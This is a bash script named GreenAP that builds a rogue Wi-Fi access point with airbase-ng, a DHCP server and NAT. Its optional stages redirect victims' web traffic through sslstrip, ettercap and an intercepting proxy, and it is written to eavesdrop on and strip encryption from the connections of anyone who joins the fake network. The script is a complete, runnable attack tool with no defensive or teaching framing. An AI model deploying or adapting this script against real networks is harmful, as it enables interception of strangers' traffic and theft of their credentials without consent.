#!/usr/bin/env bash
#
# GreenAP, by Lunitaris.
# Please ask me before modifying it!


##### DEFINITION DES COULEURS ##########

GREEN="\e[92m"
YELLOW="\e[93m"
PURPLE="\e[95m"
CYAN="\e[96m"
BLANC="\e[97m"
RED="\e[91m"
LIGHTGRAY="\e[37m"

UNDERL="\e[4m"
BOLD="\e[1m"
RST="\e[0m"

########################################
USE_SSLTRIP="no"	## sslstrip to break a ssl connexion
USE_ETTERCAP="no"	## ettercap tools and plugins
USE_PROXY="yes"		## Le fameux Proxy!

LOG=/tmp/GreenRogue.log
iface_rogue="wlan0"
iface_spot="at0"
iface_mon="wlan0"
DHCP_server="udhcpd"	# DHCP server to use. (udhcpd / dhcpd for archlinux)
DefaultChannel=$(iwlist $iface_rogue channel | grep Current | tail -c 4 | cut -d ')' -f 1)

######## Specifique a ArchLinux....
if [ $iface_rogue == "wlp1s0" ]; then
	iface_mon=$iface_rogue"mon"
	echo -e "$PURPLE Using $iface_mon $RST"
fi

########################################

verifArgs()
{
        local usage=" $BOLD $YELLOW Error! usage: rogueAP (start | stop) AP_Name [-c cannal] [-b bssid] $RST" # to display
	[[ $# -eq 0 ]] && echo -e $usage && exit 1	# if no args

	[[ "$1" == "stop" ]] && echo -e "$CYAN Killing rogueAP" && stopAP && echo -e "$PURPLE Done! $RST" && exit 0      # Stop the rogueAP
	[[ "$1" != "start" ]] && echo -e $usage && exit 1

	shift
	[[ -z "$1" ]] && echo -e "$YELLOW No AP name given! $RST" && echo -e $usage && exit 1
		AP_Name=$1	# Access Point name from args

	###### start loop for optionals args ####



	while true; do
        	case $1 in
                	-c)
                        	shift&&AP_Cannal="$1" && echo -e "$PURPLE Using channel $AP_Cannal $RST"
               		;;
                	-b)
                        	shift&&AP_BSSID="-b $1"
               		;;
        	esac
	        shift || break
	done

	[[ -z $DefaultChannel ]] && echo -e "No default channel found for wlan0, using channel 1." &&  DefaultChannel=1
}

#################################################

#################################################

verifDependances(){
	if ! type "$1" > /dev/null; then
		echo -e "$PURPLE $1 not installed or not found in path. arborting.. $RST"
		exit 8	# code retour dependances manquantes
	fi
}


cleanIPTABLES()
{
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
}


stopAP()
{
	# Removing old configuration files and killing proccess already running
	#########################################################################
	rm /tmp/udhcpd.* &> /dev/null
	killall airbase-ng &> /dev/null
	killall udhcpd &> /dev/null
	killall proxy.py &> /dev/null
	ifconfig $iface_mon down
	#iw $iface_mon del				# avec iw
	#airmon-ng stop $iface_mon &> /dev/null		# avec airmon-ng
	iwconfig $iface_mon mode managed
	cleanIPTABLES
}

setNET()
{
	echo "Available interfaces: "
	echo -e "$LIGHTGRAY"  && ip link show | awk '{print $2,$9}' | sed '2~2d' && echo -e "$RST"
	read -p "Net interace? " iface_net

	# Testing if interface $net_iface exists
	ip link show | grep $iface_net &> /dev/null
	[[ $? -ne 0 ]] && echo -e "$YELLOW No interface named '$iface_net' found! Arborting!" && exit 2
        	## Code 2: error with iface_net name

	echo -e
	## Configuration Proxy
	ynProx='N'
	read -p "Are you using Proxy with $iface_net interface? [y/N] " ynProx
	if [ "$ynProx" == "y" ] || [ "$ynProx" == "Y" ]; then
        	echo -e "$PURPLE Setting Proxy... $RST"
        	read -p "Enter your proxy address: " proxy_addr
        	echo -e "$PURPLE Exporting proxy value... $RST"
        	export http_proxy=$proxy_addr
	fi
	givenet="y"	# we will be tested to activate the NAT
}

# Verification of args
verifArgs $1 $2 $3 $4
verifDependances "udhcpd"
verifDependances "iw"		# avec iw
#verifDependances "airmon-ng"	# avec airmon-ng


givenet="n"
read -p "Would you like to provide internet access? [y/N] " givenet
[[ $givenet == "Y" || $givenet == "y" ]] && setNET

## Default Args ##
if [ -z $AP_Cannal ]; then
	AP_Cannal=$DefaultChannel
	echo -e "$PURPLE Channel not specified, using Default AP Channel.. $RST"
fi

if [ -z $AP_BSSID ]; then
	AP_BSSID=""
	echo -e "$PURPLE BSSID not specified, using default mac address $RST"
fi




###################

echo -e " $BOLD $GREEN Generating udhcpd config file in /tmp/udhcpd.conf $RST"
echo "max_leases 250
start 192.168.3.2
end 192.168.3.254
interface at0
domain local
option dns 8.8.8.8
option subnet 255.255.255.0
option router 192.168.3.1
lease 7200
lease_file /tmp/udhcpd.leases" > /tmp/GreenDHCP.conf

# Fichier contenant les infos sur les clients connectes au hotspot
touch /tmp/udhcpd.leases

echo "Cleaning iptables ..."
cleanIPTABLES



# Setting teh monitorin interface......
echo -e "$PURPLE Putting $iface_rogue in monitoring mode... $RST"
#->#  airmon-ng start $iface_rogue $AP_Cannal &> /dev/null			# avec airmon-ng
#ifconfig $iface_rogue down
#iw $iface_rogue interface add $iface_mon type monitor			# avec iw
# ifconfig mon0 up

ifconfig $iface_rogue down
iwconfig $iface_rogue mode monitor
#iface_mon=$iface_rogue
ifconfig $iface_mon up

echo "Created: interface $iface_mon in monitoring mode!"
sleep 5
clear

echo -e "$CYAN Creating AP: $AP_Name on canal: $cannal $RST"
echo -e "$LIGHTGRAY airbase-ng -c $AP_Cannal -e $AP_Name $AP_BSSID $iface_mon& $RST"
airbase-ng -c $AP_Cannal -e $AP_Name $AP_BSSID $iface_mon& &>> /dev/null
sleep 3


# Activation de l'interface at0
echo -e "$PURPLE Waking $iface_spot up... $RST"
ifconfig $iface_spot up
ifconfig $iface_spot 192.168.3.1 netmask 255.255.255.0
echo "adding a route"
route add -net 192.168.3.0 netmask 255.255.255.0 gw 192.168.3.1

if [ "$USE_SSLTRIP" == "yes" ]; then
	verifDependances "sslstrip"
	echo "setting up sslstrip interception"
	iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 15000
	echo -e "$CYAN Starting SSLSTRIP $RST"
	echo -e "$LIGHTGRAY sslstrip logs are at /tmp/$AP_Name_SSL.log $RST"
                    sslstrip -w /tmp/$AP_Name_SSL.log -a -l 15000 -f &
                    sleep 2
fi


### Start DHCP Server #####
echo -e "$PURPLE Starting DHCP server $RST"

[[ $DHCP_server == "dhcpd" ]] && dhcpd -d -f -cf "/tmp/GreenDHCP.conf" at0 & &>> $LOG
[[ $DHCP_server == "udhcpd" ]] && udhcpd /tmp/GreenDHCP.conf &>> $LOG
sleep 3

if [ "$USE_ETTERCAP" == "yes" ]; then
	verifDependances "ettercap"
	echo "Launching ettercap, spy all hosts on the at0 interface's subnet"
	xterm -bg black -fg blue -e ettercap --silent -T -q -p --log-msg ${LOGS_PATH}/ettercap.log -i at0 // // &
        sleep 8
fi


if [ "$USE_PROXY" == "yes" ]; then
	# verifDependances "Sergio-Proxy"
	# Redirection de http vers port 8080
	 iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 8080
	xterm -bg black -fg cyan -e "python2.7 proxy.py"&
fi

####################################################
echo 1 > /proc/sys/net/ipv4/ip_forward

# Reset des regkes IP tables
#echo -e "$BOLD $GREEN Cleaning iptables $RST"
#cleanIPTABLES

# Active le NAT
echo -e "$GREEN Activating NAT $RST"
[[ $givenet == "y" ]] && iptables -t nat -A POSTROUTING -o $iface_net -j MASQUERADE

echo -e
echo -e " $BOLD $CYAN Réseau $AP_Name créé sur le cannal $AP_Cannal. $RST"
echo -e
echo -e "$LIGHTGRAY Network Router: $UNDERL 192.168.3.1 $RST"
echo -e "$LIGHTGRAY Network start $UNDERL 192.168.3.2 $RST"
echo -e "$LIGHTGRAY Network end $UNDERL 192.168.3.254 $RST"
echo -e "$BLANC Network interface: $UNDERL $iface_spot $RST"

# xterm -e "tcptrack -i $iface_spot port 80"&	# Lance un tracker tcp sur le port 80
#xterm -e "iftop -i $iface_spot"&		# Monitoring network
#xterm -e "dsniff -i $iface_spot"&		# dsniff
exit 0
